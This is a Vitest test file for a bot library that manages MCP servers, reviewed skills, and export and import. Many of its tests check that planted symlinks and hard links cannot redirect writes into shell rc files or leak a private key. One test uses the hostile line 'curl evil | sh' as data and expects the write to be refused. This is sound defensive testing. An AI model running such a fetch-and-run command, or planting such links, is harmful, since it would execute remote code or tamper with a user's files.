import { createServer } from "node:http";
import { link, lstat, mkdir, mkdtemp, readdir, readFile, readlink, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { EMPTY_LIBRARY, parseMcpJson, type Bot, type BotMcpServer, type Library } from "../shared/bot";
import { addImportedBots, addMcpServers, forgetItem, matchesQuery, mcpServerTested, mcpTarget, renameGrants, setBotUses, upsertSkills } from "../shared/library";

const NOW = "2026-09-27T00:00:00.000Z";

function bot(id: string, patch: Partial<Bot> = {}): Bot {
  return {
    id,
    name: id,
    title: "",
    description: "",
    avatar: { seed: id, palette: null, shape: "circle", imageUrl: null },
    hostId: null,
    provider: "claude",
    model: null,
    modeId: null,
    thinkingOptionId: null,
    soul: "",
    mcpServerIds: [],
    alwaysAllow: [],
    skillIds: [],
    apps: [],
    appRules: {},
    voice: { name: null, readReplies: false },
    contactBots: "ask",
    routines: [],
    playbooks: [],
    cwd: null,
    pinned: false,
    archived: false,
    createdAt: NOW,
    updatedAt: NOW,
    ...patch,
  };
}

const fetchConfig = { type: "stdio" as const, command: "uvx", args: ["mcp-server-fetch"], env: {} };
const fetchDraft: BotMcpServer = { name: "fetch", enabled: true, config: fetchConfig };

describe("addMcpServers", () => {
  it("reuses an identical server and renames a clashing one", () => {
    const first = addMcpServers(EMPTY_LIBRARY, [fetchDraft], { now: NOW });
    const again = addMcpServers(first.library, [fetchDraft, { ...fetchDraft, config: { ...fetchConfig, args: ["other"] } }], { now: NOW });
    expect(again.ids[0]).toBe(first.ids[0]);
    expect(again.library.mcpServers.map((server) => server.name)).toEqual(["fetch", "fetch-2"]);
  });

  it("gives imported bots their own servers, switched off, never the user's", () => {
    const mine = addMcpServers(EMPTY_LIBRARY, [fetchDraft], { now: NOW });
    const library = { ...mine.library, mcpServers: mine.library.mcpServers.map((server) => ({ ...server, enabled: true, tools: [] })) };
    const redacted = { ...fetchDraft, config: { ...fetchConfig, env: { KEY: "<redacted>" } } };
    const next = addImportedBots({ bots: [], history: [], library }, [
      { bot: bot("a"), skills: [], mcpServers: [fetchDraft] },
      { bot: bot("b"), skills: [], mcpServers: [fetchDraft, redacted] },
    ]);
    const servers = next.library!.mcpServers;
    expect(servers.map((server) => [server.name, server.enabled])).toEqual([["fetch", true], ["fetch-2", false], ["fetch-3", false]]);
    expect(next.bots.map((entry) => entry.mcpServerIds)).toEqual([[servers[1]!.id], [servers[1]!.id, servers[2]!.id]]);
  });

  it("adds servers switched off until a test connects", () => {
    const { library } = addMcpServers(EMPTY_LIBRARY, [fetchDraft]);
    expect(library.mcpServers[0]!.enabled).toBe(false);
    expect(mcpServerTested(library.mcpServers[0]!)).toBe(false);
    expect(mcpServerTested({ tools: [], checkError: null })).toBe(true);
    expect(mcpServerTested({ tools: [], checkError: "refused" })).toBe(false);
  });
});

describe("upsertSkills", () => {
  it("adds fetched skills switched off and unreviewed, and a refresh needs a new review", () => {
    const library: Library = { ...EMPTY_LIBRARY, skills: [{ id: "pdf", description: "old", source: "a", enabled: true, reviewedSha: "abc", createdAt: NOW, updatedAt: NOW }] };
    const next = upsertSkills(library, [
      { id: "pdf", description: "new", source: "" },
      { id: "docx", description: "Word", source: "b" },
    ]);
    expect(next.skills.map((skill) => [skill.id, skill.description, skill.source, skill.enabled, skill.reviewedSha, skill.createdAt === NOW])).toEqual([
      ["pdf", "new", "a", true, null, true],
      ["docx", "Word", "b", false, null, false],
    ]);
  });

  it("switches on a skill written here, reviewed as written", () => {
    const next = upsertSkills(EMPTY_LIBRARY, [{ id: "mine", description: "d", source: "", reviewedSha: "f00" }]);
    expect(next.skills[0]).toMatchObject({ enabled: true, reviewedSha: "f00" });
  });
});

describe("bot references", () => {
  it("switches items on and off per bot and forgets deleted ones", () => {
    const a = setBotUses(bot("a"), "skill", "pdf", true);
    expect(setBotUses(a, "skill", "pdf", true)).toBe(a);
    expect(a.skillIds).toEqual(["pdf"]);
    const b = setBotUses(bot("b"), "mcp", "m1", true);
    expect(forgetItem([a, b], "skill", "pdf").map((entry) => entry.skillIds)).toEqual([[], []]);
  });

  it("rewrites always-allowed grants when a server is renamed", () => {
    const [renamed, untouched] = renameGrants([bot("a", { alwaysAllow: ["fetch/get", "fetcher/x"] }), bot("b")], "fetch", "web");
    expect(renamed!.alwaysAllow).toEqual(["web/get", "fetcher/x"]);
    expect(untouched!.alwaysAllow).toEqual([]);
  });
});

describe("display helpers", () => {
  it("describes a connection and matches searches", () => {
    expect(mcpTarget(fetchDraft.config)).toBe("uvx mcp-server-fetch");
    expect(mcpTarget({ type: "sse", url: "https://x/sse", headers: {} })).toBe("SSE · https://x/sse");
    expect(matchesQuery("FET", "fetch")).toBe(true);
    expect(matchesQuery("", "anything")).toBe(true);
    expect(matchesQuery("zz", "fetch", null)).toBe(false);
  });
});

// ---------------------------------------------------------------- server

describe("server library", () => {
  let home: string;
  beforeAll(async () => {
    home = await mkdtemp(join(tmpdir(), "paseo-bots-lib-"));
    process.env.PASEO_HOME = home;
  });
  afterAll(async () => {
    delete process.env.PASEO_HOME;
    await rm(home, { recursive: true, force: true });
  });

  it("moves the old paseo-bot data folder to the new name and links it", async () => {
    const { migrateRenamedPluginData, pluginDataPath } = await import("../server/bot-home");
    const { mkdir, readlink, readFile } = await import("node:fs/promises");
    const legacy = join(home, "plugin-data", "paseo-bot");
    await mkdir(legacy, { recursive: true });
    await writeFile(join(legacy, "composio.json"), "{}");
    migrateRenamedPluginData();
    expect(await readFile(join(pluginDataPath(), "composio.json"), "utf8")).toBe("{}");
    expect(await readlink(legacy)).toBe(pluginDataPath());
    // Running it again leaves everything as it is.
    migrateRenamedPluginData();
    expect(await readlink(legacy)).toBe(pluginDataPath());
  });

  it("only gives bots skills whose SKILL.md is what the user reviewed", async () => {
    const { writeSkill, sha256 } = await import("../server/library");
    const { promptContext } = await import("../server/prompt");
    const text = "---\nname: gated\ndescription: G\n---\nBody\n";
    await writeSkill({ id: "gated", text });
    const skill = (reviewedSha: string | null | undefined) => ({ id: "gated", description: "G", source: "", enabled: true, reviewedSha, createdAt: NOW, updatedAt: NOW });
    const names = async (reviewedSha: string | null | undefined) =>
      (await promptContext(bot("gate-bot", { skillIds: ["gated"] }), true, { skills: [skill(reviewedSha)], mcpServers: [] }, false)).skills.map((entry) => entry.name);
    expect(await names(sha256(text))).toEqual(["gated"]);
    expect(await names(undefined)).toEqual(["gated"]);
    expect(await names(null)).toEqual([]);
    expect(await names(sha256("something else"))).toEqual([]);
  });

  it("writes, reads and deletes library skills", async () => {
    const { writeSkill, readSkill, deleteSkill, sha256 } = await import("../server/library");
    const written = "---\nname: notes\ndescription: Keep notes\n---\n\nBody\n";
    expect(await writeSkill({ id: "notes", text: written })).toEqual({ description: "Keep notes", sha: sha256(written) });
    const read = await readSkill({ id: "notes" });
    expect(read.missing).toBe(false);
    expect(read.files).toEqual(["SKILL.md"]);
    await deleteSkill({ id: "notes" });
    expect((await readSkill({ id: "notes" })).missing).toBe(true);
  });

  it("links a bot's skills into its folder and drops links it no longer uses", async () => {
    const { writeSkill, linkBotSkills, librarySkillPath } = await import("../server/library");
    const { botDataPath } = await import("../server/bot-home");
    await writeSkill({ id: "a", text: "---\nname: a\ndescription: A\n---\n" });
    await writeSkill({ id: "b", text: "---\nname: b\ndescription: B\n---\n" });
    const paths = await linkBotSkills("bot-x", ["a", "b"]);
    expect(paths.get("a")).toBe(join(botDataPath("bot-x"), "skills", "a", "SKILL.md"));
    expect(await readlink(join(botDataPath("bot-x"), "skills", "a"))).toBe(librarySkillPath("a"));
    expect(await readFile(paths.get("b")!, "utf8")).toContain("description: B");
    await linkBotSkills("bot-x", ["b"]);
    await expect(readlink(join(botDataPath("bot-x"), "skills", "a"))).rejects.toThrow();
  });

  it("moves skills that lived in a bot's folder into the library", async () => {
    const { migrateBotSkills, readSkill } = await import("../server/library");
    const { botDataPath } = await import("../server/bot-home");
    const { mkdir } = await import("node:fs/promises");
    await mkdir(join(botDataPath("bot-old"), "skills", "legacy"), { recursive: true });
    await writeFile(join(botDataPath("bot-old"), "skills", "legacy", "SKILL.md"), "---\nname: legacy\ndescription: Old\n---\n");
    await migrateBotSkills();
    expect((await readSkill({ id: "legacy" })).text).toContain("Old");
  });

  it("exports a bot with its skills and redacted servers, and imports it back", async () => {
    const { writeSkill } = await import("../server/library");
    const { exportBot, importBot } = await import("../server/share");
    await writeSkill({ id: "shared", text: "---\nname: shared\ndescription: S\n---\n" });
    const library: Library = {
      skills: [{ id: "shared", description: "S", source: "", enabled: true, createdAt: NOW, updatedAt: NOW }],
      mcpServers: [
        { id: "m1", name: "gh", description: "", enabled: true, config: { type: "http", url: "https://x", headers: { Authorization: "Bearer secret" } }, tools: null, checkedAt: null, checkError: null, createdAt: NOW, updatedAt: NOW },
      ],
    };
    const { json } = await exportBot({ bot: bot("src", { skillIds: ["shared"], mcpServerIds: ["m1"] }), includeMemory: false }, library);
    expect(json).not.toContain("secret");
    const imported = await importBot({ botId: "bot-new", json });
    expect(imported.bot.skillIds).toEqual(["shared"]);
    expect(imported.skills.map((skill) => skill.id)).toEqual(["shared"]);
    expect(imported.mcpServers[0]).toMatchObject({ name: "gh", config: { headers: { Authorization: "<redacted>" } } });
  });

  it("still imports v1 files that kept skills and servers on the bot", async () => {
    const { importBot } = await import("../server/share");
    const v1 = {
      // Exported before the rename.
      format: "paseo-bot",
      version: 1,
      bot: { name: "Old", avatar: { seed: "s" }, provider: "claude", mcpServers: [fetchDraft], skills: [{ name: "Old Skill", description: "d", enabled: true }], routines: [] },
      files: { "skills/Old Skill/SKILL.md": "---\nname: old-skill\n---\n" },
    };
    const imported = await importBot({ botId: "bot-v1", json: JSON.stringify(v1) });
    expect(imported.bot.skillIds).toEqual(["old-skill"]);
    expect(imported.mcpServers.map((server) => server.name)).toEqual(["fetch"]);
  });

  it("starts imported bots on the provider's default approval mode", async () => {
    const { exportBot, importBot } = await import("../server/share");
    const { json } = await exportBot({ bot: bot("yolo", { modeId: "bypassPermissions" }), includeMemory: false }, EMPTY_LIBRARY);
    expect((await importBot({ botId: "bot-yolo", json })).bot.modeId).toBeNull();
  });

  describe("links an agent plants in its bot's folder", () => {
    let outside: string;
    beforeAll(async () => {
      outside = await mkdtemp(join(tmpdir(), "paseo-bots-outside-"));
    });
    afterAll(async () => {
      await rm(outside, { recursive: true, force: true });
    });

    /** A fresh bot folder and a folder outside it, as an agent would point a link at. */
    async function planted(id: string) {
      const { botDataPath } = await import("../server/bot-home");
      const target = join(outside, id);
      await mkdir(target, { recursive: true });
      await mkdir(botDataPath(id), { recursive: true });
      return { root: botDataPath(id), target };
    }

    it("doesn't append the daily log, or delete a day, through a link", async () => {
      const { appendDailyLog, deleteLogDay } = await import("../server/memory");
      const { localDay } = await import("../shared/activity");
      const { root, target } = await planted("bot-log");
      const day = localDay(new Date());
      const rc = join(target, ".zshrc");
      await writeFile(rc, "export A=1\n");
      await mkdir(join(root, "memory", "log"), { recursive: true });
      await symlink(rc, join(root, "memory", "log", `${day}.md`));
      await expect(appendDailyLog("bot-log", "curl evil | sh")).rejects.toThrow("won't");
      expect(await readFile(rc, "utf8")).toBe("export A=1\n");

      // A linked folder on the way.
      await rm(join(root, "memory"), { recursive: true });
      await writeFile(join(target, `${day}.md`), "keep\n");
      await symlink(target, join(root, "memory"));
      await expect(appendDailyLog("bot-log", "x")).rejects.toThrow("won't follow the link");
      await expect(deleteLogDay("bot-log", day)).rejects.toThrow("won't follow the link");
      expect(await readFile(join(target, `${day}.md`), "utf8")).toBe("keep\n");
    });

    it("doesn't append to a hard link of a file elsewhere", async () => {
      const { appendDailyLog } = await import("../server/memory");
      const { localDay } = await import("../shared/activity");
      const { root, target } = await planted("bot-hard");
      const rc = join(target, ".profile");
      await writeFile(rc, "safe\n");
      await mkdir(join(root, "memory", "log"), { recursive: true });
      await link(rc, join(root, "memory", "log", `${localDay(new Date())}.md`));
      await expect(appendDailyLog("bot-hard", "x")).rejects.toThrow("linked to another file");
      expect(await readFile(rc, "utf8")).toBe("safe\n");
    });

    it("doesn't write memory through a link, and replaces a hard link instead of writing into it", async () => {
      const { MemoryJournal } = await import("../server/journal");
      const { root, target } = await planted("bot-mem");
      const rc = join(target, ".bashrc");
      await writeFile(rc, "original\n");
      await symlink(rc, join(root, "MEMORY.md"));
      const journal = new MemoryJournal();
      await expect(journal.write("bot-mem", "MEMORY.md", "# Memory\n")).rejects.toThrow("won't follow the link");
      expect(await readFile(rc, "utf8")).toBe("original\n");

      await rm(join(root, "MEMORY.md"));
      await link(rc, join(root, "MEMORY.md"));
      await journal.write("bot-mem", "MEMORY.md", "# Memory\n");
      expect(await readFile(rc, "utf8")).toBe("original\n");
      expect(await readFile(join(root, "MEMORY.md"), "utf8")).toBe("# Memory\n");

      await symlink(target, join(root, "memory"));
      await expect(journal.write("bot-mem", "notes.md", "x")).rejects.toThrow("won't follow the link");
      await expect(journal.write("bot-mem", ".bashrc", null)).rejects.toThrow("won't follow the link");
      expect(await readdir(target)).toEqual([".bashrc"]);
    });

    it("doesn't save uploads into a linked folder", async () => {
      const { saveUpload } = await import("../server/uploads");
      const { root, target } = await planted("bot-up");
      await symlink(target, join(root, "uploads"));
      await expect(saveUpload({ botId: "bot-up", fileName: "a.txt", dataBase64: Buffer.from("hi").toString("base64") })).rejects.toThrow("won't follow the link");
      expect(await readdir(target)).toEqual([]);
    });

    it("leaves a linked skills folder and what it points at alone", async () => {
      const { linkBotSkills, migrateBotSkills, librarySkillPath, writeSkill } = await import("../server/library");
      const { root, target } = await planted("bot-skills");
      await writeSkill({ id: "s1", text: "---\nname: s1\n---\n" });
      await writeFile(join(target, "tool"), "#!/bin/sh\n");
      await symlink(join(target, "tool"), join(target, "brew"));
      await mkdir(join(target, "Documents"));
      await symlink(target, join(root, "skills"));

      const paths = await linkBotSkills("bot-skills", ["s1"]);
      expect(paths.get("s1")).toBe(join(librarySkillPath("s1"), "SKILL.md"));
      expect((await lstat(join(target, "brew"))).isSymbolicLink()).toBe(true);
      expect(await readdir(target)).not.toContain("s1");

      await migrateBotSkills();
      expect((await lstat(join(target, "Documents"))).isDirectory()).toBe(true);
      expect(await lstat(librarySkillPath("Documents")).catch(() => null)).toBeNull();
    });

    it("leaves links out of an export", async () => {
      const { exportBot } = await import("../server/share");
      const { root, target } = await planted("bot-share");
      await writeFile(join(target, "id_rsa"), "PRIVATE KEY");
      await writeFile(join(root, "MEMORY.md"), "# Memory\n");
      await mkdir(join(root, "memory"));
      await writeFile(join(root, "memory", "ok.md"), "fine");
      await symlink(target, join(root, "memory", "home"));
      await symlink(join(target, "id_rsa"), join(root, "memory", "key.md"));
      await link(join(target, "id_rsa"), join(root, "memory", "hard.md"));
      const { json } = await exportBot({ bot: bot("bot-share"), includeMemory: true }, EMPTY_LIBRARY);
      expect(json).not.toContain("PRIVATE KEY");
      expect(Object.keys(JSON.parse(json).files).sort()).toEqual(["MEMORY.md", "memory/ok.md"]);
    });
  });
});

describe("probeMcpServer", () => {
  const fakeServer = `
    const rl = require("readline").createInterface({ input: process.stdin });
    rl.on("line", (line) => {
      const msg = JSON.parse(line);
      if (msg.method === "initialize") console.log(JSON.stringify({ jsonrpc: "2.0", id: msg.id, result: { protocolVersion: "2025-06-18", capabilities: { tools: {} }, serverInfo: { name: "fake", version: "1" } } }));
      if (msg.method === "tools/list" && !msg.params.cursor) console.log(JSON.stringify({ jsonrpc: "2.0", id: msg.id, result: { tools: [{ name: "echo", description: "Echoes\\nsecond line" }], nextCursor: "p2" } }));
      if (msg.method === "tools/list" && msg.params.cursor === "p2") console.log(JSON.stringify({ jsonrpc: "2.0", id: msg.id, result: { tools: [{ name: "add" }] } }));
    });`;

  it("lists a stdio server's tools across pages", async () => {
    const { probeMcpServer } = await import("../server/mcp-probe");
    const result = await probeMcpServer({ config: { type: "stdio", command: process.execPath, args: ["-e", fakeServer], env: {} } });
    expect(result).toEqual({ ok: true, tools: [{ name: "echo", description: "Echoes" }, { name: "add", description: "" }] });
  });

  it("reports a command that can't start or exits, without leaking env values", async () => {
    const { probeMcpServer } = await import("../server/mcp-probe");
    const missing = await probeMcpServer({ config: { type: "stdio", command: "definitely-not-a-command-xyz", args: [], env: {} } });
    expect(missing.ok).toBe(false);
    const exits = await probeMcpServer({ config: { type: "stdio", command: process.execPath, args: ["-e", "console.error('bad key ' + process.env.TOKEN); process.exit(3)"], env: { TOKEN: "sk-12345" } } });
    expect(exits).toMatchObject({ ok: false });
    expect(!exits.ok && exits.error).toContain("code 3");
    expect(!exits.ok && exits.error).not.toContain("sk-12345");
  });

  it("speaks streamable HTTP with a session and event-stream answers", async () => {
    const { probeMcpServer } = await import("../server/mcp-probe");
    const seen: string[] = [];
    const http = createServer((request, response) => {
      let body = "";
      request.on("data", (chunk: Buffer) => (body += chunk.toString()));
      request.on("end", () => {
        if (request.method !== "POST") return response.writeHead(200).end();
        seen.push(`${request.headers["mcp-session-id"] ?? "-"} ${request.headers.authorization ?? "-"}`);
        const msg = JSON.parse(body) as { id?: number; method: string };
        if (msg.id === undefined) return response.writeHead(202).end();
        if (msg.method === "initialize") {
          response.writeHead(200, { "Content-Type": "application/json", "Mcp-Session-Id": "s1" });
          return response.end(JSON.stringify({ jsonrpc: "2.0", id: msg.id, result: {} }));
        }
        response.writeHead(200, { "Content-Type": "text/event-stream" });
        response.end(`event: message\ndata: ${JSON.stringify({ jsonrpc: "2.0", id: msg.id, result: { tools: [{ name: "search", description: "Find" }] } })}\n\n`);
      });
    });
    await new Promise<void>((resolve) => http.listen(0, "127.0.0.1", resolve));
    const { port } = http.address() as { port: number };
    try {
      const result = await probeMcpServer({ config: { type: "http", url: `http://127.0.0.1:${port}/mcp`, headers: { Authorization: "Bearer t" } } });
      expect(result).toEqual({ ok: true, tools: [{ name: "search", description: "Find" }] });
      expect(seen).toEqual(["- Bearer t", "s1 Bearer t", "s1 Bearer t"]);
    } finally {
      http.close();
    }
  });
});

describe("MCP servers on this computer", () => {
  it("reads Claude Code's and Cursor's servers and skips what isn't there", async () => {
    const { mkdtemp, mkdir, rm, writeFile } = await import("node:fs/promises");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");
    const home = await mkdtemp(join(tmpdir(), "paseo-bots-home-"));
    const previous = process.env.HOME;
    process.env.HOME = home;
    try {
      await writeFile(join(home, ".claude.json"), JSON.stringify({ projects: { "/x": { mcpServers: { local: { command: "a" } } } }, mcpServers: { fetch: { command: "uvx", args: ["mcp-server-fetch"] } } }));
      await mkdir(join(home, ".cursor"));
      await writeFile(join(home, ".cursor", "mcp.json"), "{ not json");
      const { mcpSources } = await import("../server/mcp-sources");
      const { sources } = await mcpSources();
      expect(sources.map((source) => [source.label, source.count])).toEqual([["Claude Code", 1]]);
      expect(parseMcpJson(sources[0]!.json).map((server) => server.name)).toEqual(["fetch"]);
    } finally {
      process.env.HOME = previous;
      await rm(home, { recursive: true, force: true });
    }
  });
});
